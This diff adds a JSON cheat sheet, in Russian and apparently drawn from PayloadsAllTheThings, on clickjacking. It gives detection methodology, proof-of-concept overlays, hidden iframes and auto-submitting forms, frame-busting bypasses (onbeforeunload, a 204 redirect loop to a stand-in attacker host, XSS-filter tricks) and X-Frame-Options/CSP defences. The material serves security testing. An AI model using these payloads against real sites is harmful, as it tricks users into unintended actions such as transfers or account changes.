@@ -1,0 +1,215 @@
+{
+  "category": "Clickjacking",
+  "source": "PayloadsAllTheThings/Clickjacking/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое Clickjacking",
+      "language": "text",
+      "tags": ["methodology", "concept"],
+      "body": "Clickjacking (UI redressing) — атака, при которой вредоносный сайт обманом заставляет пользователя кликнуть не туда, куда он думает. Целевая страница загружается в прозрачный iframe поверх (или под) заманчивого интерфейса приманки; клик пользователя на самом деле уходит на скрытую кнопку/ссылку легитимного сайта.\n\nТак можно выполнить любое действие, доступное обычному пользователю: сменить пароль, нажать «Удалить аккаунт», лайкнуть/удалить пост, оставить комментарий, подтвердить перевод средств — всё это без ведома и согласия жертвы."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Как проверить, фреймится ли страница (детект)",
+      "language": "text",
+      "tags": ["methodology", "detection", "headers"],
+      "body": "1. Загрузи целевую страницу в свой <iframe> на стороннем origin и открой в браузере. Если страница отрисовалась внутри фрейма — она потенциально уязвима.\n2. Проверь заголовки ответа целевой страницы:\n   • X-Frame-Options: DENY / SAMEORIGIN — фрейминг запрещён (полностью / с чужого origin).\n   • Content-Security-Policy: frame-ancestors 'self' (или список доменов) — современная защита, имеет приоритет над X-Frame-Options.\n   • Если оба заголовка отсутствуют — страницу можно встроить в iframe с любого сайта.\n3. Проверь cookie сессии: при SameSite=Lax/Strict cookie может не уйти в кросс-сайтовом iframe → действие не выполнится даже при успешном фрейминге.\n4. Сам по себе фрейминг — ещё не баг. Импакт есть, только если на странице во фрейме доступно чувствительное действие в один-два клика (смена email/пароля, удаление, перевод, выдача прав)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать импакт",
+      "language": "text",
+      "tags": ["methodology", "impact", "recon"],
+      "body": "• Действия, меняющие состояние и выполняемые в один клик: «Удалить аккаунт», «Подтвердить перевод», «Сделать публичным», «Добавить администратора», «Сменить email/пароль».\n• Кнопки подтверждения OAuth / выдачи прав приложению.\n• Лайки, подписки, репосты, голосования — для накрутки.\n• Формы, где значения можно предзаполнить через URL-параметры, а пользователю остаётся только «дослать» их кликом.\n• Цепочка кликов (multi-step) реализуется через drag&drop или последовательное позиционирование iframe."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "PortSwigger Burp — генератор Clickjacking PoC и проверка заголовков.\nzaproxy/zaproxy — OWASP ZAP, пассивные проверки X-Frame-Options / CSP.\nmachine1337/clickjack — генератор PoC-страниц для clickjacking."
+    },
+
+    {
+      "subcategory": "UI Redressing",
+      "title": "Базовый PoC — прозрачный overlay (opacity: 0)",
+      "language": "html",
+      "tags": ["poc", "ui-redressing", "overlay"],
+      "body": "<div style=\"opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;\">\n  <a href=\"malicious-link\">Click me</a>\n</div>"
+    },
+    {
+      "subcategory": "UI Redressing",
+      "title": "Как работает UI Redressing",
+      "language": "text",
+      "tags": ["ui-redressing", "concept"],
+      "body": "Атакующий накладывает прозрачный UI-элемент поверх легитимной страницы. Шаги:\n• Прозрачный элемент: создаётся <div>, перекрывающий всю видимую область, и делается невидимым через opacity: 0;.\n• Позиционирование и слои: position: absolute; top: 0; left: 0; растягивают элемент на весь вьюпорт; из-за прозрачности пользователь его не видит.\n• Обманные элементы: внутри прозрачного контейнера размещаются фейковые кнопки/ссылки/формы, выполняющие действие при клике.\n• Взаимодействие: кликая по видимому интерфейсу, пользователь на самом деле жмёт на скрытые элементы поверх него → непреднамеренные действия."
+    },
+
+    {
+      "subcategory": "Invisible Frames",
+      "title": "Невидимый iframe (нулевые размеры, без рамки)",
+      "language": "html",
+      "tags": ["poc", "iframe", "invisible"],
+      "body": "<iframe src=\"malicious-site\" style=\"opacity: 0; height: 0; width: 0; border: none;\"></iframe>"
+    },
+    {
+      "subcategory": "Invisible Frames",
+      "title": "Как работают невидимые фреймы",
+      "language": "text",
+      "tags": ["iframe", "invisible", "concept"],
+      "body": "Скрытый iframe делают невидимым, задавая нулевые размеры (height: 0; width: 0;) и убирая рамку (border: none;). Контент внутри может быть фишинговой формой, загрузкой малвари и т.п.\n• src указывает на ресурс, подконтрольный атакующему, и грузится молча.\n• Поверх невидимого iframe раскладывают заманчивые элементы; прозрачную кнопку позиционируют ровно над скрытым контентом.\n• Клик по видимой кнопке = клик по скрытому контенту во фрейме → отправка формы, переход по ссылке, финансовая операция без ведома жертвы."
+    },
+
+    {
+      "subcategory": "Button/Form Hijacking",
+      "title": "Скрытая форма (display: none) — заготовка",
+      "language": "html",
+      "tags": ["poc", "form-hijacking"],
+      "body": "<form action=\"malicious-site\" method=\"POST\" id=\"hidden-form\" style=\"display: none;\">\n<!-- Hidden form fields -->\n</form>"
+    },
+    {
+      "subcategory": "Button/Form Hijacking",
+      "title": "Видимая кнопка над скрытой формой + сабмит",
+      "language": "html",
+      "tags": ["poc", "form-hijacking", "submit"],
+      "body": "<button onclick=\"submitForm()\">Click me</button>\n<form action=\"legitimate-site\" method=\"POST\" id=\"hidden-form\">\n  <!-- Hidden form fields -->\n</form>\n<script>\n  function submitForm() {\n    document.getElementById('hidden-form').submit();\n  }\n</script>"
+    },
+    {
+      "subcategory": "Button/Form Hijacking",
+      "title": "Execution — скрытая форма с предзаполненными полями",
+      "language": "html",
+      "tags": ["poc", "form-hijacking", "execution"],
+      "body": "  <form action=\"malicious-site\" method=\"POST\" id=\"hidden-form\" style=\"display: none;\">\n  <input type=\"hidden\" name=\"username\" value=\"attacker\">\n  <input type=\"hidden\" name=\"action\" value=\"transfer-funds\">\n  </form>"
+    },
+    {
+      "subcategory": "Button/Form Hijacking",
+      "title": "Execution — функция сабмита по клику",
+      "language": "javascript",
+      "tags": ["poc", "form-hijacking", "execution"],
+      "body": "  function submitForm() {\n    document.getElementById('hidden-form').submit();\n  }"
+    },
+
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "onBeforeUnload — отмена frame-busting (с промптом)",
+      "language": "html",
+      "tags": ["bypass", "frame-busting", "onbeforeunload"],
+      "body": "<h1>www.fictitious.site</h1>\n<script>\n    window.onbeforeunload = function()\n    {\n        return \" Do you want to leave fictitious.site?\";\n    }\n</script>\n<iframe src=\"http://target site\">"
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "Почему onBeforeUnload ломает frame-busting",
+      "language": "text",
+      "tags": ["bypass", "frame-busting", "onbeforeunload"],
+      "body": "Frame-busting JS пытается «вырваться» из фрейма, загружая URL целевой страницы в верхнее окно вместо iframe. Обработчик onbeforeunload возвращает строку, которая показывается пользователю с вопросом, хочет ли он покинуть страницу. Увидев промпт, пользователь скорее всего нажмёт «Отмена» → навигация прерывается → попытка frame-busting проваливается."
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "204 No Content — обход без промпта (страница-заглушка)",
+      "language": "php",
+      "tags": ["bypass", "frame-busting", "204"],
+      "body": "<?php\n    header(\"HTTP/1.1 204 No Content\");\n?>"
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "204 No Content — обход без промпта (страница атакующего)",
+      "language": "javascript",
+      "tags": ["bypass", "frame-busting", "204"],
+      "body": "<script>\n    var prevent_bust = 0;\n    window.onbeforeunload = function() {\n        prevent_bust++;\n    };\n    setInterval(\n        function() {\n            if (prevent_bust > 0) {\n                prevent_bust -= 2;\n                window.top.location = \"http://attacker.site/204.php\";\n            }\n        }, 1);\n</script>\n<iframe src=\"http://target site\">"
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "Тот же результат без участия пользователя",
+      "language": "text",
+      "tags": ["bypass", "frame-busting", "204"],
+      "body": "Предыдущий приём с промптом требует действия пользователя. Тот же эффект достигается автоматически: атакующий в обработчике onBeforeUnload постоянно (например, каждую миллисекунду) отправляет навигацию на страницу, которая отвечает заголовком «HTTP/1.1 204 No Content». Ответ 204 не вызывает навигации → frame-busting не срабатывает, и промпт пользователю не показывается."
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "Disabling JavaScript — restricted-фрейм (IE) и sandbox",
+      "language": "html",
+      "tags": ["bypass", "frame-busting", "sandbox"],
+      "body": "<iframe src=\"http://target site\" security=\"restricted\"></iframe>\n<iframe src=\"http://target site\" sandbox></iframe>"
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "Отключение клиентских защит",
+      "language": "text",
+      "tags": ["bypass", "frame-busting"],
+      "body": "Клиентский frame-busting держится на JavaScript. Если у жертвы JS отключён или атакующий может его отключить во фрейме — защиты не будет. Три приёма деактивации фреймов:\n• IE (с IE6): атрибут security=\"restricted\" у фрейма блокирует JS, ActiveX и редиректы внутри него.\n• HTML5: атрибут sandbox включает набор ограничений на контент во фрейме (на момент написания — Chrome и Safari).\n• Отключить JS целиком через настройки/политику браузера жертвы."
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "Frame-busting код, который ломают XSS-фильтры",
+      "language": "html",
+      "tags": ["bypass", "frame-busting", "xss-filter"],
+      "body": "<script>\n    if ( top != self )\n    {\n        top.location=self.location;\n    }\n</script>"
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "IE8 XSS filter — индуцируем ложное срабатывание",
+      "language": "html",
+      "tags": ["bypass", "xss-filter", "ie8"],
+      "body": "<iframe src=”http://target site/?param=<script>if”>"
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "Как XSS-фильтр IE8 помогает обойти frame-busting",
+      "language": "text",
+      "tags": ["bypass", "xss-filter", "ie8"],
+      "body": "Фильтр IE8 видит все параметры запросов/ответов и сравнивает их с набором регулярок, ища reflected XSS. При срабатывании он отключает все инлайновые скрипты на странице, включая frame-busting-скрипты. Поэтому атакующий специально вызывает ложное срабатывание, вставляя начало frame-busting-скрипта в параметр запроса → защитный скрипт целевой страницы отключается."
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "Chrome 4.0 XSSAuditor — точечное отключение скрипта",
+      "language": "html",
+      "tags": ["bypass", "xss-filter", "xssauditor"],
+      "body": "<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>"
+    },
+    {
+      "subcategory": "Обход frame-busting",
+      "title": "Чем XSSAuditor отличается от фильтра IE8",
+      "language": "text",
+      "tags": ["bypass", "xss-filter", "xssauditor"],
+      "body": "Поведение немного иное: атакующий деактивирует конкретный «script», передав его код в параметре запроса. Это позволяет прицельно убить именно сниппет с frame-busting-кодом, оставив остальные скрипты страницы нетронутыми."
+    },
+
+    {
+      "subcategory": "Защита (проверка)",
+      "title": "X-Frame-Options (Apache)",
+      "language": "apache",
+      "tags": ["defense", "x-frame-options", "headers"],
+      "body": "Header always append X-Frame-Options SAMEORIGIN"
+    },
+    {
+      "subcategory": "Защита (проверка)",
+      "title": "CSP frame-ancestors (meta-тег)",
+      "language": "html",
+      "tags": ["defense", "csp", "frame-ancestors"],
+      "body": "<meta http-equiv=\"Content-Security-Policy\" content=\"frame-ancestors 'self';\">"
+    },
+    {
+      "subcategory": "Защита (проверка)",
+      "title": "Что проверять в заголовках",
+      "language": "text",
+      "tags": ["defense", "checklist", "headers"],
+      "body": "• X-Frame-Options: DENY — фрейминг запрещён полностью; SAMEORIGIN — только с того же origin. Устаревший, но всё ещё рабочий заслон.\n• Content-Security-Policy: frame-ancestors — современный механизм, имеет приоритет над X-Frame-Options. 'self' разрешает фрейминг только своему origin, можно перечислить доверенные домены.\n• Отсутствие обоих заголовков = страницу можно встроить в iframe с любого сайта → кандидат на clickjacking.\n• Дополнительно: SameSite-cookie (Lax/Strict) ограничивают отправку cookie в кросс-сайтовом фрейме и снижают эксплуатируемость."
+    },
+
+    {
+      "subcategory": "Эксплуатация",
+      "title": "Challenge — разбор уязвимого сниппета",
+      "language": "html",
+      "tags": ["exploitation", "example"],
+      "body": "<div style=\"position: absolute; opacity: 0;\">\n  <iframe src=\"https://legitimate-site.com/login\" width=\"500\" height=\"500\"></iframe>\n</div>\n<button onclick=\"document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';\">Click me</button>"
+    },
+    {
+      "subcategory": "Эксплуатация",
+      "title": "Разбор: как работает скрытый iframe в примере",
+      "language": "text",
+      "tags": ["exploitation", "example"],
+      "body": "В сниппете прозрачный (opacity: 0) iframe 500×500 со страницей логина легитимного сайта лежит поверх контента. Пользователь видит только кнопку «Click me» и считает, что взаимодействует с ней. На деле кнопка по onclick дёргает contentWindow.location первого iframe и перенаправляет его на malicious-site.com. Поскольку iframe невидим, жертва не догадывается, что её клик уводит скрытый фрейм на сайт атакующего."
+    }
+  ]
+}
